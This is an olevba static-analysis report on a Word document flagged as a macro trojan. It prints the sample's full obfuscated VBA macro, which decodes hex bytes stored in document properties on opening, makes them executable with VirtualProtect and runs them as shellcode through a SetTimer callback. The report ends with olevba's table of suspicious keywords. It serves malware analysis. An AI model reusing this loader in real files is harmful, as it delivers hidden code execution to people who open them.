olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-cc8a90a7eb9dbb91af86b62fbd63db0e8130b29825d0cbc544285e90c8fc3c61
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-cc8a90a7eb9dbb91af86b62fbd63db0e8130b29825d0cbc544285e90c8fc3c61 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function RignumPediatrician Lib "user32" Alias "KillTimer" (ByVal StephanurusPhyllin As LongPtr, ByVal SoloecophanesCumbrousness As LongPtr) As LongPtr
#Else
Private Declare Function WindmillsVitaglass Lib "user32" Alias "SetTimer" ( ByVal SulphogermanateMensingOutthank As Long, ByVal GrownupStrawstacker As Long, ByVal CarfufflingSdrucciolaRambunctiousness As Long, ByVal TrencheringCrouseAconic As Any) As Long
#End If
#If VBA7 Then
Private Declare PtrSafe Function WindmillsVitaglass Lib "user32" Alias "SetTimer" (ByVal DrogueBowyerUncollectively As LongPtr, ByVal SentineledStercovorous As LongPtr, ByVal GoyazitePhanerosis As LongPtr, ByVal WellchosenHypotrichosis As LongPtr) As LongPtr
Private Declare PtrSafe Function PetrographCorineusExtirpations Lib "kernel32" Alias "VirtualProtect" (ByVal TerriersResponses As LongPtr, ByVal PathographicalMajestiesMarrer As LongPtr, ByVal PottaroSplineway As LongPtr, AnaphalantiasisPerplication As LongPtr) As LongPtr
#Else
Private Declare Function PetrographCorineusExtirpations Lib "kernel32" Alias "VirtualProtect"  (ByVal ThoughtsickJewlessCowleeching As Long, ByVal SheilingGastronomes As Long, ByVal KindheartednessUnclusteredCharruan As Long, TheoremicProgoneateAcetosity As Long) As Long
Private Declare Function RignumPediatrician Lib "user32" Alias "KillTimer" ( ByVal MassageuseSchoolmasterlikeRepaired As Long, ByVal NotchingFlatlings As Long) As Long
#End If
Private Sub Document_Open()
Dim GypsterFulgidDispericraniate() As Byte
#If Win64 Then
GypsterFulgidDispericraniate = HolopneusticAppellationsDesponded(ActiveDocument.BuiltInDocumentProperties(GMRQdpz7D("yKimGO")).Value)
#Else
GypsterFulgidDispericraniate = HolopneusticAppellationsDesponded(ActiveDocument.BuiltInDocumentProperties(GMRQdpz7D("EmZS9LHDq3")).Value)
#End If
#If VBA7 Then
Dim BackhousesLayaboutsInvoke As LongPtr
Dim ChuffestImprobably As LongPtr
Dim AeronauticsSuperglacialTsuba As LongPtr
Dim OntogenesisLutayoHedysarum As LongPtr
#Else
Dim BackhousesLayaboutsInvoke As Long
Dim ChuffestImprobably As Long
Dim AeronauticsSuperglacialTsuba As Long
Dim OntogenesisLutayoHedysarum As Long
#End If
ChuffestImprobably = UBound(GypsterFulgidDispericraniate) + 1
AeronauticsSuperglacialTsuba = VarPtr(GypsterFulgidDispericraniate(0))
PetrographCorineusExtirpations AeronauticsSuperglacialTsuba, ChuffestImprobably, 64, VarPtr(BackhousesLayaboutsInvoke)
GetObject(GMRQdpz7D("yvEFoHXE")).Environment(GMRQdpz7D("psiGCF"))(GMRQdpz7D("knbZpSyc")) = ActiveDocument.FullName
GetObject(GMRQdpz7D("yhPp3YYlrl")).Environment(GMRQdpz7D("T8OAsBdAG"))(GMRQdpz7D("YOUzi4hadbqn")) = GMRQdpz7D("yj6drx")
OntogenesisLutayoHedysarum = WindmillsVitaglass(0, AeronauticsSuperglacialTsuba, 1, AeronauticsSuperglacialTsuba)
CleanupsTarradiddleSiddha 1
RignumPediatrician 0, OntogenesisLutayoHedysarum
GetObject(GMRQdpz7D("saV5YsIXQ")).Environment(GMRQdpz7D("audHFxs")).Remove (GMRQdpz7D("za0z7LAY"))
GetObject(GMRQdpz7D("VDQ4Xr_R2")).Environment(GMRQdpz7D("SZ9692")).Remove (GMRQdpz7D("obSEvKseq"))
ReDim GypsterFulgidDispericraniate(1)
End Sub
Sub CleanupsTarradiddleSiddha(Finish)
Dim TooshBrent As Long
Dim SnowlessUnrayAntilogistically As Long
SnowlessUnrayAntilogistically = Timer() + (Finish)
Do
TooshBrent = Timer()
DoEvents
Loop Until TooshBrent > SnowlessUnrayAntilogistically
End Sub
Public Function GMRQdpz7D(strInput)
GMRQdpz7D = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function MashlinLongee(CorallidomousIgnite, PreinvestmentTransversospinal)
MashlinLongee = Mid(CorallidomousIgnite, PreinvestmentTransversospinal + 1, 1)
End Function
Function BecassineDwight(UntuneableMayeye) As Long
If Int(Rnd(23)) > 2 Then
BecassineDwight = 9000
Else
BecassineDwight = Len(UntuneableMayeye)
End If
End Function
Function HolopneusticAppellationsDesponded(LouseberryStereotypers)
ReDim UnarduouslyAlignerSharkskin(BecassineDwight(LouseberryStereotypers) - 1) As Byte
Dim StinkbugsNonetFrenchification As Long, FetorGanoid As Long
Dim UnaccidentallyRefascinationPinyons: UnaccidentallyRefascinationPinyons = GMRQdpz7D("mrCPf6WGJ") & GMRQdpz7D("qm2bXr")
For StinkbugsNonetFrenchification = 0 To BecassineDwight(LouseberryStereotypers) - 1 Step 2
FetorGanoid = StinkbugsNonetFrenchification / 2
UnarduouslyAlignerSharkskin(FetorGanoid) = CDec(UnaccidentallyRefascinationPinyons & MashlinLongee(LouseberryStereotypers, StinkbugsNonetFrenchification) & MashlinLongee(LouseberryStereotypers, StinkbugsNonetFrenchification + 1))
Next
HolopneusticAppellationsDesponded = UnarduouslyAlignerSharkskin
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

